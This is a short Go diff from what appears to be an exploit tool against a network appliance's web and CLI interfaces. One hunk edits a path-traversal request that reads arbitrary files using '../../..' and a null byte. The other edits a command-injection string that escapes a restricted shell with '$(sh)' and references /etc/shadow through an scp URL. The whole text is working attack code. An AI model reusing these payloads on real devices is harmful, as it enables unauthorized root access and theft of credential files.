@@ -259,9 +259,9 @@ func readPath(path string, port int) (s []string, err error) {
 	}
 	client := &http.Client{Transport: tr}
 
-	data := strings.NewReader("mac=../../.." + path + "%00")
+	data := strings.NewReader("macAddr=../../.." + path + "%00")
 
-	resp, err := client.Post("https://"+Address+":"+strconv.Itoa(port)+"/action.php5?_page=Backup&_action=get&name=bloop&debug=true", "application/x-www-form-urlencoded", data)
+	resp, err := client.Post("https://"+Address+":"+strconv.Itoa(port)+"/action.php5?_page=ActiveAPDetailInfoWebUI&_action=get", "application/x-www-form-urlencoded", data)
 	if err != nil {
 		fmt.Println(err)
 		return s, err
@@ -349,7 +349,7 @@ func restrictedShellRoot(pubkey, username, password string) {
 	fmt.Printf(".Done!\n")
 	fmt.Println("Writing commands:")
 
-	_, err = wr.Write([]byte("save web-page web-directory test http://$(sh)\n"))
+	_, err = wr.Write([]byte("save web-page web-directory test scp://root@192.168.1.1:/etc/shadow$(sh)\n"))
 	check(err)
 
 	cmds := []string{
